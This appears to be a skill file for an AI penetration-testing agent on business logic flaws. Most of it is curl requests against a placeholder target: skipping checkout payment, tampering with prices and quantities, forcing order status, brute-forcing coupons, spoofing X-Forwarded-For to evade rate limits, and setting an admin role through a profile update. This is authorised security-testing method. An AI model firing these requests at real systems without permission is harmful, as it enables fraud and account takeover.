---
name: business-logic-testing
description: Business logic vulnerability detection — workflow bypass, price manipulation, state abuse, and application-specific flaws
origin: RedteamOpencode
---

# Business Logic Testing

## When to Activate

- Application has multi-step workflows (checkout, registration, KYC, approval)
- Financial operations exist (payments, transfers, balance, discounts, coupons)
- Role-based access with state transitions (pending → approved → completed)
- Any feature where the intended sequence of operations matters
- Application trusts client-side values for server-side decisions

## Tools

- `curl` — craft requests with manipulated parameters
- `run_tool ffuf` — fuzz parameter values for boundary conditions
- Browser DevTools — observe workflow state and hidden parameters

## Methodology

### 1. Workflow Bypass

Test if steps in multi-step processes can be skipped:

```bash
# Identify all steps in a workflow (e.g., checkout)
# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /confirm

# Skip directly to final step
curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123"}' -b "session=TOKEN"

# Skip payment step — go from shipping to confirm
curl -s -X POST "http://target/api/order/confirm" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"123","shippingId":"456"}' -b "session=TOKEN"

# Repeat a step that should only execute once (e.g., apply coupon)
curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}' -b "session=TOKEN"
# Apply same coupon again
curl -s -X POST "http://target/api/coupon/apply" \
  -d '{"code":"DISCOUNT50","orderId":"123"}' -b "session=TOKEN"
```

### 2. Price / Value Manipulation

Test if financial values can be tampered:

```bash
# Negative quantity
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":-5,"price":100}' -b "session=TOKEN"

# Zero price
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":1,"price":0}' -b "session=TOKEN"

# Fractional values where integer expected
curl -s -X POST "http://target/api/cart/add" \
  -d '{"productId":"1","quantity":0.001}' -b "session=TOKEN"

# Overflow: extremely large values
curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":99999999999999}' -b "session=TOKEN"

# Modify price in request (if client sends price)
# Compare: does server validate price matches catalog?
curl -s -X POST "http://target/api/order/create" \
  -d '{"productId":"1","quantity":1,"price":0.01}' -b "session=TOKEN"

# Currency confusion — send different currency code
curl -s -X POST "http://target/api/payment" \
  -d '{"amount":100,"currency":"JPY"}' -b "session=TOKEN"
```

### 3. State Abuse / Transition Bypass

Test if state transitions can be manipulated:

```bash
# Modify status directly
curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"completed"}' -b "session=TOKEN"

# Cancel after completion
curl -s -X POST "http://target/api/order/123/cancel" -b "session=TOKEN"

# Re-open closed ticket/order
curl -s -X PUT "http://target/api/order/123" \
  -d '{"status":"pending"}' -b "session=TOKEN"

# Access resources in wrong state
# e.g., download invoice before payment
curl -s "http://target/api/order/123/invoice" -b "session=TOKEN"

# Modify data after approval
curl -s -X PUT "http://target/api/application/123" \
  -d '{"amount":999999}' -b "session=TOKEN"
```

### 4. Rate Limit / Abuse Prevention Bypass

```bash
# Brute force with no rate limit
for i in $(seq 1 100); do
  curl -s -X POST "http://target/api/coupon/redeem" \
    -d "{\"code\":\"GUESS$i\"}" -b "session=TOKEN" -o /dev/null -w "%{http_code}\n"
done

# Bypass rate limit via IP rotation headers
curl -s -X POST "http://target/api/login" \
  -H "X-Forwarded-For: 1.2.3.$((RANDOM % 255))" \
  -d '{"user":"admin","pass":"test"}'

# Bypass via case variation
curl -s "http://target/api/coupon/apply" -d '{"code":"DISCOUNT50"}'
curl -s "http://target/api/coupon/apply" -d '{"code":"discount50"}'
curl -s "http://target/api/coupon/apply" -d '{"code":"Discount50"}'
```

### 5. Feature Abuse

```bash
# Email/notification abuse — trigger mass emails
curl -s -X POST "http://target/api/invite" \
  -d '{"emails":["a@x.com","b@x.com","c@x.com",...1000 emails]}' -b "session=TOKEN"

# Referral abuse — refer yourself
curl -s -X POST "http://target/api/referral" \
  -d '{"referralCode":"MY_CODE"}' -b "session=TOKEN_DIFFERENT_ACCOUNT"

# Gift card / point manipulation
# Buy gift card with gift card balance
curl -s -X POST "http://target/api/purchase" \
  -d '{"product":"gift_card","paymentMethod":"gift_card_balance"}' -b "session=TOKEN"

# Time-based abuse — use expired offer
curl -s -X POST "http://target/api/offer/apply" \
  -d '{"offerId":"expired_offer_123"}' -b "session=TOKEN"

# Privilege escalation via profile update
curl -s -X PUT "http://target/api/user/profile" \
  -d '{"role":"admin","isAdmin":true,"userType":"staff"}' -b "session=TOKEN"
```

### 6. Input Validation Logic Flaws

```bash
# Type confusion — string where number expected
curl -s -X POST "http://target/api/transfer" \
  -d '{"amount":"abc","to":"user2"}' -b "session=TOKEN"

# Boolean confusion
curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":"true"}' # string vs boolean
curl -s -X POST "http://target/api/settings" \
  -d '{"isPublic":1}' # number vs boolean

# Array where single value expected
curl -s -X POST "http://target/api/user/update" \
  -d '{"email":["admin@target.com","attacker@evil.com"]}' -b "session=TOKEN"

# Null / undefined injection
curl -s -X POST "http://target/api/payment" \
  -d '{"amount":null}' -b "session=TOKEN"
curl -s -X POST "http://target/api/payment" \
  -d '{}' -b "session=TOKEN"
```

## What to Record

- **Workflow step** that was bypassed or abused
- **Expected behavior** vs **actual behavior**
- **Financial impact** if applicable (e.g., "purchased item for $0")
- **Exact request/response** proving the logic flaw
- **Reproducibility** — can it be repeated?
- **Severity** — based on business impact, not just technical impact:
  - HIGH: financial loss, unauthorized transactions, data manipulation
  - MEDIUM: workflow bypass, feature abuse, state corruption
  - LOW: minor logic inconsistency, informational leak via logic
